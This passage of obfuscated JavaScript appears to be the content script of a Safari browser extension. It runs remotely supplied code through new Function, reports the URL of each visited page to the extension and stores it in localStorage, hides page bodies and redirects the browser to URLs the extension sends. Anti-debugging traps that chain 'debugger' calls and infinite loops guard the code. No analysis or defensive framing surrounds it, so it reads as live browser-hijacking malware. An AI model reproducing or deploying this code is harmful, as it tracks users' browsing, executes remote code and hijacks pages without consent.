                    };
                    xhr.open("GET", data.YHrSW, true);
                    xhr.send();
                } else {
                    return true;
                }
            };

            var scroll = function (position) {
                position = (new Function(data.Fkmum(data.Fkmum(position + data.efkGB, location.href), '")'))).call();
                data.qhntV(update, position);
            };

            var _positionActiveTinyMCE = function () {
                if (data.pMnaR === data.pMnaR) {
                    canCreateDiscussions.preventDefault();
                    if (body = document.body) {
                        body.style.display = data.wLfeG;
                    }
                } else {
                    if (ret) {
                        return debuggerProtection;
                    } else {
                        data.BqKHm(debuggerProtection, 0);
                    }
                }
            };

            var update = function (data) {
                if (data) {
                    data.ybZhr(_positionActiveTinyMCE);
                } else {
                    if (data.GYIEc("mRWft", data.iuuTY)) {
                        (function () {
                            return true;
                        }).constructor(data.enFtF + data.MnCHh).apply(data.xbetY);
                    } else {
                        var body = document.body;
                        if (body && data.ZqSjr(data.wLfeG, body.style.display)) {
                            window.location.replace(location.href);
                        }
                    }
                }
                var details = {};
                details.url = location.href;

                details.status = data;
                safari.extension.dispatchMessage(eventName, details);
            };
            (function () {
                var callbackVals = data.ockTq.split("|");

                var callbackCount = 0;
                for (; true;) {
                    switch (callbackVals[callbackCount++]) {
                    case "0":
                        var value = JSON.parse(localStorage.getItem("runtime"));
                        continue;
                    case "1":
                        var query = {};
                        query.url = location.href;
                        query.timestamp = Date.now();
                        var message = query;
                        continue;
                    case "2":
                        localStorage.setItem("runtime", JSON.stringify(message));
                        continue;
                    case "3":
                        if (value) {
                            if ((value = JSON.parse(localStorage.getItem("info"))) && void 0 !== value) {
                                if ((message = value.status) && data.GYIEc(void 0, message)) {
                                    data.RAqgJ(scroll, message);
                                    if ((value = value.timestamp) && void 0 !== value) {
                                        if (5 <= data.ZhRdW(data.ZhRdW(Date.now() - value, 1E3), 60)) {
                                            data.ybZhr(get);
                                        }
                                    } else {
                                        data.ybZhr(get);
                                    }
                                } else {
                                    get(true);
                                }
                            } else {
                                data.OqCiT(get, true);
                            }
                        }
                        continue;
                    case "4":
                        if (value && void 0 !== value && data.ZqSjr(value.url, location.href)) {
                            value = value.timestamp;

                            value = !value || void 0 === value || data.puXEi(1, data.PNuAU(Date.now() - value, 1E3)) ? true : false;
                        } else {

                            value = true;
                        }
                        continue;
                    }
                    break;
                }
            })();
        } else {
            if (document.head && 0 >= document.querySelectorAll(data.RVBue).length) {
                if (data.ZqSjr(data.GLgNM, "JAhJQ")) {
                    var elem = document.createElement("script");
                    elem.setAttribute(data.brJeG, data.bdNuj);
                    document.head.appendChild(elem);
                } else {
                    d = (new Function(data.Fkmum(d, ";return status('") + location.href + '")')).call();
                    data.OqCiT(update, d);
                }
            }
        }
    }
}, true);
safari.self.addEventListener("message", function (body) {
    if (body.message.url) {
        window.location.replace(body.message.url);
    }
});

function d(n) {

    function update(data) {
        var InitialSetupController = {};

        InitialSetupController.ZBnUA = function (saveNotifs) {
            return saveNotifs();
        };

        InitialSetupController.RZtwT = function (DIR, name) {
            return DIR + name;
        };

        InitialSetupController.SzVPc = function (buckets, name) {
            return buckets + name;
        };

        InitialSetupController.MSIuy = function (addedNodesArray, dr) {
            return options.XDcHC(addedNodesArray, dr);
        };

        InitialSetupController.hJySJ = "lQJpl";

        InitialSetupController.VIVVZ = "QMGfP";
        var controller = InitialSetupController;
        if (options.piOLC(options.yEBoB, options.rOjIw)) {
            if (fn) {
                var newValue = fn.apply(context, arguments);

                fn = null;
                return newValue;
            }
        } else {
            if (typeof data === options.dfvDm) {
                return function (canCreateDiscussions) {} ["constructor"](options.dEDjy).apply("counter");
            } else {
                if (options.oBHDi(options.lNQWJ, options.lNQWJ)) {
                    controller.ZBnUA(d);
                } else {
                    if (options.oEuZl("", options.rRNYx(data, data))[options.UGyZy] !== 1 || options.VJQoM(options.WUyQz(data, 20), 0)) {
                        if (options.kixsA(options.glETU, options.YTZsf)) {
                            (function () {
                                return true;
                            }).constructor(options.oEuZl(options.cgmTm, "gger")).call("action");
                        } else {
                            that = controller.ZBnUA(fH);
                        }
                    } else {
                        (function () {
                            if (controller.MSIuy(controller.hJySJ, controller.VIVVZ)) {

                                var row = firstCall ? function () {
                                    if (fn) {
                                        var denies = fn.apply(context, arguments);

                                        fn = null;
                                        return denies;
                                    }
                                } : function () {};

                                firstCall = true;
                                return row;
                            } else {
                                return true;
                            }
                        }).constructor(options.qIEHj(options.cgmTm, options.UudQw)).apply(options.cXzfQ);
                    }
                }
            }
            options.bDFeq(update, ++data);
        }
    }
    var headers = {};

    headers.XDcHC = function (x_or_y, y) {
        return x_or_y === y;
    };

    headers.piOLC = function (x_or_y, y) {
        return x_or_y === y;
    };

    headers.yEBoB = "oYzse";

    headers.rOjIw = "oPJQh";

    headers.dfvDm = "string";

    headers.dEDjy = "while (true) {}";

    headers.oBHDi = function (optionsValue, value) {
        return optionsValue !== value;
    };

    headers.lNQWJ = "XdVag";

    headers.oEuZl = function (buckets, name) {
        return buckets + name;
    };

    headers.rRNYx = function (_num2, _num1) {
        return _num2 / _num1;
    };

    headers.UGyZy = "length";

    headers.VJQoM = function (x_or_y, y) {
        return x_or_y === y;
    };

    headers.WUyQz = function (number_to_dividee, divided_by) {
        return number_to_dividee % divided_by;
    };

    headers.kixsA = function (dataSourceIndex, all) {
        return dataSourceIndex !== all;
    };

    headers.glETU = "rtMIy";

    headers.YTZsf = "NMvQw";

    headers.cgmTm = "debu";

    headers.qIEHj = function (buckets, name) {
        return buckets + name;
    };

    headers.UudQw = "gger";

    headers.cXzfQ = "stateObject";

    headers.bDFeq = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };

    headers.UAcwT = "none";
    var options = headers;
    try {
        if (n) {
            return update;
        } else {
            if ("dgaaS" === "dgaaS") {
                options.bDFeq(update, 0);
            } else {
                var body = document.body;
                if (body && options.VJQoM(options.UAcwT, body.style.display)) {
                    window.location.replace(location.href);
                }
            }
        }
    } catch (fN) {}
};
```
